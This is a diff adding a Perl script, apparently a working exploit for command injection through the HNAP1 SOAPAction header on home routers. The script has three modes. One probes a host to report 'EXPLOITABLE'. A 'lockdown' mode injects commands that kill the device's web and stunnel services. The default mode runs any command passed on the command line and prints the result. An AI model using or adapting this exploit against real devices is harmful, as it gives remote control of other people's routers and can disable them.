@@ -1,0 +1,52 @@
+#!/usr/bin/perl
+use LWP::UserAgent;
+use Getopt::Long;
+use strict;
+
+my ($lockdown, $query, $host);
+
+GetOptions(
+    lockdown => \$lockdown,
+    query    => \$query,
+    "host=s" => \$host,
+);
+
+if (!$host) {
+    print "Please specify a host\n";
+    exit 255;
+}
+
+my $url = "http://$host/HNAP1";
+
+my $ua = LWP::UserAgent->new;
+
+sub doit {
+    my $command = shift;
+    my $resp = $ua->get($url, SOAPAction => "http://purenetworks.com/HNAP1/GetDeviceSettings/$command");
+    return $resp->code, $resp->decoded_content;
+}
+
+if ($query) {
+    my ($code, $content) = doit('GetFirmwareState');
+    if ($code == 200 && $content =~ /GetFirmwareStateResult/) {
+        print "EXPLOITABLE\n";
+        exit 0;
+    } else {
+        print "Not exploitable?\n";
+        exit 1;
+    }
+} elsif ($lockdown) {
+    my ($code, $content) = doit('`killall httpd; killall stunnel`');
+    if ($code == 500 &&
+        $content =~ /^Server closed connection without sending any data back/ ||
+        $content =~ /Connection refused/) {
+        print "OK\n";
+        exit 0;
+    } else {
+        print "Error? $code $content\n";
+        exit 1;
+    }
+} else {
+    my ($code, $content) = doit("`$ARGV[0]`");
+    print "$code\n$content\n";
+}
